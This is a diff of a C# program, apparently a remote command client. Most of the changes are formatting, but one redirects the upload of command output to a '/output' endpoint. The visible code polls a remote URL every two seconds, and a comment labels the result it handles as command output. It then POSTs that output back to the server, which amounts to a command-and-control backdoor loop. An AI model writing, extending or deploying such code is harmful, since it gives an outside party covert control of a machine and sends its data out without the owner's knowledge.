@@ -26,8 +26,9 @@ namespace CMDCommandUsingCsharp
         static bool Check(string URL)
         {
             HttpWebRequest request = (HttpWebRequest)WebRequest.Create(URL);
-            try {
-                HttpWebResponse response = (HttpWebResponse)request.GetResponse(); 
+            try
+            {
+                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                 StreamReader reader = new StreamReader(response.GetResponseStream());
                 string content = reader.ReadToEnd();
                 if (content != "")
@@ -40,7 +41,8 @@ namespace CMDCommandUsingCsharp
         }
 
 
-        static async Task clear() {
+        static async Task clear()
+        {
 
             using (var client = new HttpClient())
             {
@@ -53,9 +55,9 @@ namespace CMDCommandUsingCsharp
 
             using (var client = new HttpClient())
             {
-                using (var content = new FormUrlEncodedContent(new Dictionary<string, string> { { "out", $"{ans}" } } ))
+                using (var content = new FormUrlEncodedContent(new Dictionary<string, string> { { "out", $"{ans}" } }))
                 {
-                    var response = await client.PostAsync($"{URL}", content);
+                    var response = await client.PostAsync($"{URL}/output", content);
                 }
             }
         }
@@ -103,7 +105,7 @@ namespace CMDCommandUsingCsharp
                     Task task1 = answer(result);
                     // Display the command output.
                     //Console.WriteLine(result);
-                    
+
                     Task task2 = clear();
                 }
                 Thread.Sleep(2000);
